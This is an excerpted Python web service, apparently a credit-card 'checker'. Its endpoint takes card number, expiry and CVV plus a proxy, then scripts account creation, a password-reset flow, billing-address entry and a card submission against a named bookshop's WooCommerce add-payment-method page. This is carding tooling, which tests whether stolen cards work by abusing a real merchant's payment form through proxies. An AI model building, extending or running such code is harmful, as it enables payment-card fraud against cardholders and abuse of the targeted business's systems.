...
def home():
    return jsonify({
        ...
        'endpoints': {
            ...
            'example': '/check?cc=4111111111111111|12|26|123&proxy=http://user:pass@host:port'
        },
    ...
    try:
        ...
        async def process_card():
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                async with session.get('https://www.windhorsepublications.com/my-account/', headers=headers1, proxy=proxy_dict) as response:
                ...
                async with session.post('https://www.windhorsepublications.com/my-account/', headers=headers2, data=data, proxy=proxy_dict) as response:
                    html = await response.text()
                ...
                async with session.get('https://www.windhorsepublications.com/my-account/lost-password/', params=params, headers=headers3, proxy=proxy_dict) as response:
                    html = await response.text()
                ...
                async with session.post('https://www.windhorsepublications.com/my-account/lost-password/', params=params2, headers=headers4, data=data2, proxy=proxy_dict) as response:
                    pass
                ...
                async with session.get('https://www.windhorsepublications.com/my-account/edit-address/billing', headers=headers5, proxy=proxy_dict) as response:
                    html = await response.text()
                ...
                async with session.post('https://www.windhorsepublications.com/my-account/edit-address/billing/', headers=headers6, data=data3, proxy=proxy_dict) as response:
                    pass
                ...
                async with session.get('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers7, proxy=proxy_dict) as response:
                    html = await response.text()
                ...
                async with session.post('https://www.windhorsepublications.com/wp-admin/admin-ajax.php', data=payload, headers=headers8, proxy=proxy_dict) as response:
                ...
                async with session.post('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers10, data=payment_data, proxy=proxy_dict) as response:
                    html = await response.text()
